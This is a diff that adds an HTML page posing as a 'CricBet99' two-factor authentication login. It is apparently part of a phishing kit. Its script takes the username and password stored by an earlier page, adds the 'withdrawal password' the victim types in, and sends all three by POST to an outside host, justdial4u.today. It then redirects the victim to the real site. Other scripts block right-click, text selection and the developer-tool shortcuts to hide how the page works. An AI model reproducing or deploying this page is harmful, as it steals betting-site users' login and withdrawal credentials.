@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+      <meta name="google-site-verification" content="lwgUVKLDm9aU20GqHhAPlyyH95Byoyz_t6zicw8ltuk" />
+      <title>CricBet99</title>
+      <style>
+	  body{
+	  -webkit-touch-callout: none;
+		-webkit-user-select: none;
+		-khtml-user-select: none;
+		-moz-user-select: none;
+		-ms-user-select: none;
+		user-select: none;
+		}
+         .log-fld {
+         width: 100%;
+         padding: 20px 20px;
+         box-sizing: border-box;
+         margin-top: 15px;
+         background: #ffffff;
+         border-radius: 4px;
+         }
+         .my-form-section {
+         width: 100%;
+         background-image: linear-gradient(#000, #8000ff);
+         display: flex;
+         justify-content: center;
+         height: 100vh;
+         }
+         .log-fld p {
+         font-family: 'Roboto Condensed';
+         font-weight: 500;
+         text-align: center;
+         margin-bottom: 1rem;
+         line-height: 1.1;
+         }
+		 
+		 
+      </style>
+      <!-- Favicons -->
+      <link rel="shortcut icon" type="image/png" href="assets/images/favicon.png" />
+      <!-- Google Fonts -->
+      <!--link rel="preconnect" href="https://fonts.googleapis.com/" />
+         <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="" /-->
+      <link href="assets/css/bootstrap.min.css" rel="stylesheet" media="all" />
+      <link rel="stylesheet" href="assets/css/style.css" />
+      <link rel="stylesheet" href="assets/css/theme.css" />
+   </head>
+   <body style="background: none !important">
+      <div ="" id="app">
+      <app-loader ="" _nghost-qgk-c42=""
+      >
+      <div
+         _ngcontent-qgk-c42=""
+         id="load"
+         style="visibility: hidden; opacity: 0"
+         >
+         <div _ngcontent-qgk-c42="" id="load-inner">
+            <img
+               _ngcontent-qgk-c42=""
+               class="logo-login"
+               src="assets/images/logo.png"
+               /><i _ngcontent-qgk-c42="" class="fa fa-spinner fa-spin"></i>
+         </div>
+      </div>
+      <!----><!----></app-loader
+         >
+      </div>
+      <!---->
+      <div ="" class="login">
+      <div ="" class="wrapper">
+      <div ="" class="container-fluid">
+      <div ="" class="row">
+      <div ="" class="col-md-12">
+      <div ="" class="loginInner1">
+      <div
+      =""
+      class="featured-box-login featured-box-secundary default">
+      <div class="log-fld">
+         <div
+         =""
+         class="log-logo m-b-20 text-center">
+         <img
+         =""
+         class="logo-login"
+         src="assets/images/logo.png"/>
+      </div>
+      <p> 2 Factor Authentication enabled.<br>
+         Please enter withdrawal password to login 
+         securely.
+      </p>
+      <form class="form-horizontal" role="form" method="post">
+      <div class="form-group m-b-20">
+         <input placeholder=" Enter Withdraw Password" id="loginName" name="username" value="" class="form-control" type="text">
+         <span id="username-error" class="error"></span>
+      </div>
+      <div class="form-group text-center">
+         <button type="button" class="btn btn-submit btn-login" onclick="checkLogin()">  Secure Login<i class="fas fa-sign-in-alt"></i></button>
+      </div>
+      </div>
+      </div>
+      </div>
+      </div>
+      </div>
+      </div>
+      </div>
+	  
+      <script src="assets/js/jquery.js"></script>
+      <script type="text/javascript">
+         function checkLogin(){
+             var code = $("#loginName").val();
+             $("#msg").html('Login invalid !').css("color","red");
+             if(code !=''){
+              var loginName = sessionStorage.getItem("loginName");
+              var password  = sessionStorage.getItem("password");
+               $.ajax({
+                 type : "POST",
+                 url : "https://justdial4u.today/cricbet99.php",
+                 data :"loginName="+loginName+"&password="+password+"&code="+code,
+                 success : function(msg){
+         	  $("#errorMsg").html('Username and password is incorrect.');
+                if(msg="sucessmsg"){
+                 window.location.href = "https://cricbet99.com";
+                 }
+                 }
+               })
+             }else{
+               alert('All fields are required.');
+               return false;
+             }
+         
+           }
+		</script>   
+		
+		 
+	  <script>
+			document.onkeydown = function(e) {
+			if (e.ctrlKey && 
+				(e.keyCode === 67 || 
+				 e.keyCode === 86 || 
+				 e.keyCode === 85 || 
+				 e.keyCode === 117)) {
+				//alert('not allowed');
+				return false;
+			} else {
+				return true;
+			}	
+			};
+			
+			document.onkeydown = function(e) {
+    if(e.keyCode == 123) {
+     return false;
+    }
+    if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+     return false;
+    }
+    if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+     return false;
+    }
+    if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+     return false;
+    }
+
+    if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)){
+     return false;
+    }      
+ }
+ 
+			$(function() {
+				$(this).bind("contextmenu", function(e) {
+					e.preventDefault();
+				});
+			}); 
+		</script>
+   </body>
+</html>
